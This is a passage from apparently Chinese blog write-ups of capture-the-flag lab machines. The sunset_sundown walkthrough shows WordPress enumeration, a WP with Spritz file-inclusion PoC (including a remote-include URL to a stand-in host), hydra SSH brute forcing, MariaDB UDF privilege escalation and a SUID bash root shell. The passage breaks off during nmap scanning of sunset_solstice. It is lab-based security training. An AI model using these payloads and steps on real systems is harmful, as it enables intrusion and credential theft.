http://192.168.56.152/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.168.56.152/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.168.56.152/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.168.56.152/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br> |  - http://192.168.56.152/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentynineteen<br> | Location: http://192.168.56.152/wp-content/themes/twentynineteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.168.56.152/wp-content/themes/twentynineteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.5<br> | Style URL: http://192.168.56.152/wp-content/themes/twentynineteen/style.css?ver=1.5<br> | Style Name: Twenty Nineteen<br> | Style URI: https://wordpress.org/themes/twentynineteen/<br> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.5 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://192.168.56.152/wp-content/themes/twentynineteen/style.css?ver=1.5, Match:  Version: 1.5 <br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] wp-with-spritz<br> | Location: http://192.168.56.152/wp-content/plugins/wp-with-spritz/<br> | Latest Version: 1.0 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2015-08-20T20:15:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Urls In 404 Page (Passive Detection)<br> |<br> | Version: 4.2.4 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://192.168.56.152/wp-content/plugins/wp-with-spritz/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Posts - Author Pattern (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://192.168.56.152/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>发现了一个插件，搜一搜有没有漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ searchsploit spritz                        <br>----------------------------------------------------------------<br> Exploit Title       |  Path<br>----------------------------------------------------------------<br>WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                       | php/webapps/44544.php<br>----------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>存在文件包含漏洞，文件中给出了两个 PoC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span>etc/passwd<br><br><span class="hljs-regexp">/wp-content/</span>plugins<span class="hljs-regexp">/wp-with-spritz/</span>wp.spritz.content.filter.php?url=http(s):<span class="hljs-regexp">//</span>domain/exec<br></code></pre></td></tr></table></figure><p>先尝试本地文件包含</p><p><img src="/pic/365a9d03450aec59dd50741b1f9b9821_MD5.png"></p><p>成功了，发现了一个用户名 <code>carlos</code> ，接下来尝试访问常见的敏感文件，包括 shadow 文件、wordpress 配置文件、ssh 私钥文件、apache 日志文件</p><p>唯一有收获的就是 wordpress 配置文件</p><p><img src="/pic/ccbfd26b56051e61f61e12ea31b4e7b9_MD5.png"></p><p>发现了数据库密码，尝试使用此密码来 ssh 登录、wordpress 登录。均失败</p><p>尝试使用插件的第二个 PoC 来测试远程文件包含漏洞，但是遇到了问题，虽然访问了远程文件，可是却没有被 PHP 解析，反弹 shell 失败</p><h2 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h2><p>接下来尝试了使用 <code>carlos</code> 用户直接爆破其 ssh 密码，以及爆破 wordpress 中 admin 的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ hydra -l carlos -P /usr/share/wordlists/rockyou.txt 192.168.56.152 ssh<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-11 22:45:31<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking ssh://192.168.56.152:22/<br>[22][ssh] host: 192.168.56.152   login: carlos   password: carlos<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 2 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br></code></pre></td></tr></table></figure><p>爆破得到了 ssh 登录的密码，登录后查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ ssh carlos@192.168.56.152              <br>carlos@192.168.56.152\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sundown 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string"></span><br><span class="hljs-string">carlos@sundown:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for carlos: </span><br><span class="hljs-string">Sorry, user carlos may not run sudo on sundown.</span><br></code></pre></td></tr></table></figure><h2 id="提权之信息收集"><a href="#提权之信息收集" class="headerlink" title="提权之信息收集"></a>提权之信息收集</h2><p>查看环境和家目录文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:~$ <span class="hljs-built_in">ls</span> -alih<br>total 28K<br>134541 drwxr-xr-x 3 carlos carlos 4.0K Aug  3  2020 .<br>131078 drwxr-xr-x 3 root   root   4.0K Aug  3  2020 ..<br>134958 lrwxrwxrwx 1 root   root      9 Aug  3  2020 .bash_history -&gt; /dev/null<br>134542 -rw-r--r-- 1 carlos carlos  220 Aug  3  2020 .bash_logout<br>134544 -rw-r--r-- 1 carlos carlos 3.5K Aug  3  2020 .bashrc<br>135949 drwxr-xr-x 3 carlos carlos 4.0K Aug  3  2020 .<span class="hljs-built_in">local</span><br>134977 -rw------- 1 carlos carlos   33 Aug  3  2020 local.txt<br>135567 lrwxrwxrwx 1 root   root      9 Aug  3  2020 .mysql_history -&gt; /dev/null<br>134543 -rw-r--r-- 1 carlos carlos  807 Aug  3  2020 .profile<br>carlos@sundown:~$ <span class="hljs-built_in">cat</span> local.txt<br>28f84888f6bd690e321cba14659b32f2<br></code></pre></td></tr></table></figure><p>查看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    10540    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   136894     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>     6833     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3910     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>     3436     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>       55     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>     3583     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>     3908     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br>    17572    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>       53     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>       56     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>       52     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br></code></pre></td></tr></table></figure><p>尝试使用数据库密码来切换登录到 root，失败</p><p>尝试登录数据库后，查看哈希值，得到的哈希值于在线网站碰撞失败</p><h2 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h2><p>突然想到有没有可能，数据库的密码一直没用上是因为在提权阶段才会使用到，接下来查看一下 mysql 的运行状态，是否是 root 运行，考虑 UDF 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">carlos@sundown:/tmp$ ps aux | grep mysql<br>root       357  0.0  0.0   2388   696 ?        Ss   05:59   0:00 /bin/sh -c /usr/sbin/mysqld<br>root       361  0.1 11.7 1284380 119124 ?      Sl   05:59   0:18 /usr/sbin/mysqld<br>carlos    1710  0.0  0.0   6076   824 pts/0    S+   09:01   0:00 grep mysql<br></code></pre></td></tr></table></figure><p>可以尝试，看看满不满足 UDF 提权的必要条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [wordpress_db]&gt; show variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><br>MariaDB [(none)]&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+-----------------+--------------------------------------------+<br>| Variable_name   | Value                                      |<br>+-----------------+--------------------------------------------+<br>| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/|<br>| plugin_maturity | gamma                                      |<br>+-----------------+--------------------------------------------+<br></code></pre></td></tr></table></figure><p>有搞头，看了看 plugin 目录的权限，无法直接写入，那就考虑直接通过 MySQL 写入。使用的是 <a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a> 记得修改写入的插件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [(none)]&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="hljs-string">&#x27;udf.so&#x27;</span>;<br>Query OK, 0 rows affected (0.000 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> * from mysql.func;<br>+----------+-----+--------+----------+<br>| name     | ret | dl     | <span class="hljs-built_in">type</span>     |<br>+----------+-----+--------+----------+<br>| sys_eval |   0 | udf.so | <span class="hljs-keyword">function</span> |<br>+----------+-----+--------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>+--------------------+<br>| sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>) |<br>+--------------------+<br>| root               |<br>+--------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.005 sec)<br></code></pre></td></tr></table></figure><p>提权成功，想反弹 shell 但是没法得到稳定的 shell，那把 bash 文件加上 S 权限吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>);<br>+--------------------------------+<br>| sys_eval(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>) |<br>+--------------------------------+<br>| NULL                           |<br>+--------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.004 sec)<br><br>MariaDB [(none)]&gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;ls -liah /bin/bash&#x27;</span>);<br>+---------------------------------------------------------+<br>| sys_eval(<span class="hljs-string">&#x27;ls -liah /bin/bash&#x27;</span>)                          |<br>+---------------------------------------------------------+<br>| 1411 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash |<br>+---------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.004 sec)<br></code></pre></td></tr></table></figure><p>这样就可以直接使用 <code>/bin/bash -p</code> 来直接运行 root 的 shell 了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0<span class="hljs-comment"># cd /root</span><br>bash-5.0<span class="hljs-comment"># ls</span><br>proof.txt<br>bash-5.0<span class="hljs-comment"># cat proof.txt</span><br>                              _____,,,\//,,\\,/,<br>                             /-- --- --- -----<br>                            ///--- --- -- - ----<br>                           o////- ---- --- --<br>                           !!//o/---  -- --<br>                         o*) !///,~,,\\,\/,,/,//,,<br>                           o!*!o<span class="hljs-string">&#x27;(\          /\</span><br><span class="hljs-string">                         | ! o &quot;,) \/\  /\  /  \/\</span><br><span class="hljs-string">                        o  !o! !!|    \/  \/     /</span><br><span class="hljs-string">                       ( * (  o!&#x27;</span>; |\   \       /<br>                        o o ! * !` | \  /       \<br>                       o  |  o <span class="hljs-string">&#x27;o| | :  \       /</span><br><span class="hljs-string">                        *  o !*!&#x27;</span>: |o|  /      /<br>                            (o<span class="hljs-string">&#x27;&#x27;</span>| `| : /      /<br>                            ! *|<span class="hljs-string">&#x27;`  \|/       \\</span><br><span class="hljs-string">                           &#x27;</span> !o!<span class="hljs-string">&#x27;:\  \\        \</span><br><span class="hljs-string">                            ( (&#x27;</span>|  \  `._______/<br>////\\\,,\///,,,,\,/oO._*  o !*!<span class="hljs-string">&#x27;`  `.________/</span><br><span class="hljs-string">  ---- -- ------- - -oO*OoOo (o&#x27;</span><span class="hljs-string">&#x27;|           /</span><br><span class="hljs-string">    --------  ------ &#x27;</span>oO*OoO!*|<span class="hljs-string">&#x27;o!!          \</span><br><span class="hljs-string">-------  -- - ---- --* oO*OoO *!&#x27;</span>| <span class="hljs-string">&#x27;         /</span><br><span class="hljs-string"> ---  -   -----  ---- - oO*OoO!!&#x27;</span>:o!<span class="hljs-string">&#x27;       /</span><br><span class="hljs-string"> - -  -----  -  --  - *--oO*OoOo!`         /</span><br><span class="hljs-string">   \\\\\,,,\\,//////,\,,\\\/,,,\,,ejm/AMC</span><br><span class="hljs-string"></span><br><span class="hljs-string">510252fabb4b7e7dddd7373b7b3da3e8</span><br><span class="hljs-string"></span><br><span class="hljs-string">Thanks for playing - Felipe Winsnes (@whitecr0wz)</span><br></code></pre></td></tr></table></figure><p>最后的定妆照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0<span class="hljs-comment"># whoami</span><br>root<br>bash-5.0<span class="hljs-comment"># id</span><br>uid=1000(carlos) gid=1000(carlos) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(carlos)<br>bash-5.0<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:a1:1b:da brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.152/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 399sec preferred_lft 399sec<br>    inet6 fe80::a00:27ff:fea1:1bda/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>bash-5.0<span class="hljs-comment"># uname -a</span><br>Linux sundown 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_solstice 靶机</title>
    <link href="/2023/10/42e0d8744dc9.html"/>
    <url>/2023/10/42e0d8744dc9.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-solstice-靶机"><a href="#sunset-solstice-靶机" class="headerlink" title="sunset_solstice 靶机"></a>sunset_solstice 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.151 --proxies http://192.168.56.151:3128 <br>Not shown: 65525 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>80/tcp    open  http<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>2121/tcp  open  ccproxy-ftp<br>3128/tcp  open  squid-http<br>8593/tcp  open  unknown<br>54787/tcp open  unknown<br>MAC Address: 08:00:27:40:D0:9B (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放端口蛮多的，继续 nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_solstice]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,25,80,139,445,2121,3128,8593,54787,62524 192.168.56.151<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 21:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.151<br>Host is up (0.00045s latency).<br><br>PORT      STATE SERVICE     VERSION<br>21/tcp    open  ftp         pyftpdlib 1.5.6<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|  Connected to: 192.168.56.151:21<br>|  Waiting <span class="hljs-keyword">for</span> username.<br>|  TYPE: ASCII; STRUcture: File; MODE: Stream<br>|  Data connection closed.<br>|_End of status.<br>22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)<br>|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)<br>|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)<br>25/tcp    open  smtp        Exim smtpd 4.92<br>| smtp-commands: solstice Hello nmap.scanme.org [192.168.56.106], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP<br>|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP<br>80/tcp    open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">445/tcp   open              Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="hljs-string">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="hljs-string">| ftp-syst: </span><br><span class="hljs-string">|   STAT: </span><br><span class="hljs-string">| FTP server status:</span><br><span class="hljs-string">|  Connected to: 192.168.56.151:2121</span><br><span class="hljs-string">|  Waiting for username.</span><br><span class="hljs-string">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="hljs-string">|  Data connection closed.</span><br><span class="hljs-string">|_End of status.</span><br><span class="hljs-string">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="hljs-string">|_drws------   2 www-data www-data     4096 Jun 18  2020 pub</span><br><span class="hljs-string">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="hljs-string">|_http-server-header: squid/4.6</span><br><span class="hljs-string">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="hljs-string">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">|_http-title: Site doesn\&#x27;</span>t have a title (text/html; charset=UTF-8).<br>54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">62524/tcp open  tcpwrapped</span><br><span class="hljs-string">MAC Address: 08:00:27:40:D0:9B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: solstice; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="hljs-string">|   Computer name: \x00</span><br><span class="hljs-string">|   NetBIOS computer name: SOLSTICE\x00</span><br><span class="hljs-string">|   Workgroup: WORKGROUP\x00</span><br><span class="hljs-string">|_  System time: 2023-10-09T21:41:29-04:00</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-10-10T01:41:30</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: 